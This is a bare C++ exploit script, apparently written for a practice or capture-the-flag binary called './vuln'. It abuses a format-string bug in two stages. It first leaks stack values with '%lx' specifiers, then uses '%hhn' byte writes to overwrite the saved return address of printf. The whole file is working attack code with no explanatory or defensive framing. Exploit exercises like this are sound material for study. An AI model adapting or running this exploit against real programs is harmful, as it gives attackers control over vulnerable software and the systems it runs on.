//arbitrary write
#include <string>
#include <iostream>
#include <pwntools>

int main(){
using namespace pwn;
Process p{"./vuln",NULL,0};
p.set_debug(true);
std::string payload1;
payload1.append("%10$lx%11$lx");
p.sendline(payload1);
std::string rbp=p.recv(12);
std::string vuln_fun_re=p.recv(12);
std::string payload2;
long printf_re_addr=hexstr2long(rbp)-0x100-0x10-0x20-0x8;
long tmp=hexstr2long(vuln_fun_re);
std::string payload0="%13$s123";
payload0+=p64(tmp);
p.sendline(payload0);
p.recv(16);
uint8_t offset_2=tmp%256;
uint8_t offset_4=(tmp%65536)/256;
if(offset_2 > offset_4){
    payload2.append("%");
    payload2.append(std::to_string(offset_4));
    payload2.append("c%15$hhn%");
    payload2.append(std::to_string(offset_2-offset_4));
    payload2.append("c%16$hhn");
    for(int i=0;i<24-payload2.length()+1;i++) payload2.append("A");
    payload2+=p64(printf_re_addr+0x1);
    payload2+=p64(printf_re_addr+0x0);
    }
else{
    payload2.append("%");
    payload2.append(std::to_string(offset_2));
    payload2.append("c%15$hhn%");
    payload2.append(std::to_string(offset_4-offset_2));
    payload2.append("c%16$hhn");
    for(int i=0;i<24-payload2.length()+1;i++) payload2.append("A");
    payload2+=p64(printf_re_addr+0x0);
    payload2+=p64(printf_re_addr+0x1);
}
p.sendline(payload2);
p.recvall();
}